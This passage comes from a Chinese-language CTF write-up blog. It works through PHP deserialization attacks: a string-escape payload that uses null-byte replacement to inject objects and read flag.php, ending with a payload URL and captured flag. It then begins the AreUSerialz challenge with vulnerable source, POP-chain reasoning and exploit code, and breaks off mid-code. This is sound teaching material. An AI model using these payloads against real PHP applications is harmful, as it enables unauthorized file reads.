<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;UN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> A)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>即为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;UN&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">82</span>:<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span>B<span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;s:0:&quot;</span><span class="string">&quot;;s:0&quot;</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后去考虑如何才能吃掉：</p>
<p>替换规则是\0\0\0 替换为0*0 是六到三的替换</p>
<p>也就是每一组替换可以吃掉3个长度的字符</p>
<p>需要吃掉的内容：”;s:8:”password”;s:82:</p>
<p>用python测一下长度</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="title function_ invoke__">len</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:82:&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="number">22</span></span><br><span class="line">&gt;&gt;&gt; <span class="number">22</span>/<span class="number">3</span></span><br><span class="line"><span class="number">7.333333333333333</span></span><br></pre></td></tr></table></figure>

<p>不是3的整数倍 所以需要自己添加值凑成3的倍数</p>
<p>把前面的UN也吃掉就好了：UN”;s:8:”password”;s:82:</p>
<p>然后继续利用python生成\0\0\0 共8组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="string">&#x27;\0\0\0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\x00\x00\x00&#x27;</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;\\0\\0\\0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\\0\\0\\0&#x27;</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">&#x27;\\0\\0\\0&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>因为转义 所以双杠后自己替换一下就好了</p>
<p>因为决定某个值的长度不是双引号的闭合 而是前面的数字</p>
<p>所以把我们生成的替换字符放进去就会多读取后面的内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&#x27;</span>;  <span class="comment">//后面补充两个字符 因为24-22=2 去补充</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> A)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">50</span>:<span class="string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0xx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">82</span>:<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span>B<span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;s:0:&quot;</span><span class="string">&quot;;s:0&quot;</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="title function_ invoke__">len</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;xx&quot;;s:8:&quot;password&quot;;s:82:&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="number">24</span></span><br><span class="line">&gt;&gt;&gt;正好是往后面读取<span class="number">24</span>个</span><br></pre></td></tr></table></figure>

<p>但此时出现的问题时 你自己补充了两个xx确实后面吃的个数是24但是属性值前面的50也是补充后的结果 6*8 = 48-&gt;24 那么虽然补充了两个xx 但是意味着需要往后读50-24 = 26个字符长度 故读取失败</p>
<p>所以我们的补位不应该出现在这个属性值里面 而是在外面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">50</span>:<span class="string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">82</span>:<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span>B<span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;s:0:&quot;</span><span class="string">&quot;;s:0&quot;</span><span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;&#x27;</span>;  <span class="comment">//在这里的开头补充x&quot; 相当于补充了两位</span></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> A)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">84</span>:<span class="string">&quot;x&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">0</span><span class="string">&quot;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>此时往后读24</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="title function_ invoke__">len</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:84:&quot;x&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="number">24</span></span><br></pre></td></tr></table></figure>

<p>最终payload为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//122.114.252.87:2030/?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=x&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;s:0:&quot;&quot;;s:0&quot;</span></span><br></pre></td></tr></table></figure>

<p>url编码一下即可</p>
<p>成功获取flag！：flag{a6c175ea-d851-5cf1-cd6f-3aad733ae896}</p>
<hr>
<h2 id="0718-Phar反序列化"><a href="#0718-Phar反序列化" class="headerlink" title="0718 Phar反序列化"></a>0718 Phar反序列化</h2><h6 id="例题：-网鼎杯-2020-青龙组-AreUSerialz"><a href="#例题：-网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="例题：[网鼎杯 2020 青龙组]AreUSerialz"></a>例题：[网鼎杯 2020 青龙组]AreUSerialz</h6><h6 id="题目：-4"><a href="#题目：-4" class="headerlink" title="题目："></a>题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>寻找pop链：</strong></p>
<p>可以发现在read方法中存在file_get_contents函数，是可以利用获取flag的地方，所以需要我们调用read方法 可以发现在process方法中找到，就需要调用process方法并且需要op为2 所以construct方法中的无法使用，需要使用destruct方法，需要绕过他的强类型比较 将op设置为数字型的2 在强类型比较中字符型和数字型的2是不相等的 但在弱类型比较中是相等的 数字2就不加引号就可以了</p>
<p><strong>绕过上传点的限制：</strong></p>
<p>在is_valid函数中对ascii码进行一定检测，有限定范围 但是我们生成的序列化中存在\0字符，需要通过S的hex机制进行绕过检测</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __construct() &#123;</span></span><br><span class="line">    <span class="comment">//     $op = &quot;1&quot;;</span></span><br><span class="line">    <span class="comment">//     $filename = &quot;/tmp/tmpfile&quot;;</span></span><br><span class="line">    <span class="comment">//     $content = &quot;Hello World!&quot;;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;process();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function process() &#123;</span></span><br><span class="line">    <span class="comment">//     if($this-&gt;op == &quot;1&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;write();</span></span><br><span class="line">    <span class="comment">//     &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//         $res = $this-&gt;read();</span></span><br><span class="line">    <span class="comment">//         $this-&gt;output($res);</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;output(&quot;Bad Hacker!&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// private function write() &#123;</span></span><br><span class="line">    <span class="comment">//     if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;</span></span><br><span class="line">    <span class="comment">//         if(strlen((string)$this-&gt;content) &gt; 100) &#123;</span></span><br><span class="line">    <span class="comment">//             $this-&gt;output(&quot;Too long!&quot;);</span></span><br><span class="line">    <span class="comment">//             die();</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//         $res = file_put_contents($this-&gt;filename, $this-&gt;content);</span></span><br><span class="line">    <span class="comment">//         if($res) $this-&gt;output(&quot;Successful!&quot;);</span></span><br><span class="line">    <span class="comment">//         else $this-&gt;output(&quot;Failed!&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         $this-&gt;output(&quot;Failed!&quot;);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// private function read() &#123;</span></span><br><span class="line">    <span class="comment">//     $res = &quot;&quot;;</span></span><br><span class="line">    <span class="comment">//     if(isset($this-&gt;filename)) &#123;</span></span><br><span class="line">    <span class="comment">//         $res = file_get_contents($this-&gt;filename);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     return $res;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// private function output($s) &#123;</span></span><br><span class="line">    <span class="comment">//     echo &quot;[Result]: &lt;br&gt;&quot;;</span></span><br><span class="line">    <span class="comment">//     echo $s;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __destruct() &#123;</span></span><br><span class="line">    <span class="comment">//     if($this-&gt;op === &quot;2&quot;)</span></span><br><span class="line">    <span class="comment">//         $this-&gt;op = &quot;1&quot;;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;content = &quot;&quot;;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;process();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo urlencode(serialize(new FileHandler));</span></span><br><span class="line"><span class="comment">// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br><span class="line"><span class="comment">// 因为上传的时候存在检测ascii码存在一定的范围</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">FileHandler</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decorate</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$arr</span>[<span class="variable">$i</span>],<span class="string">&quot;\0&quot;</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            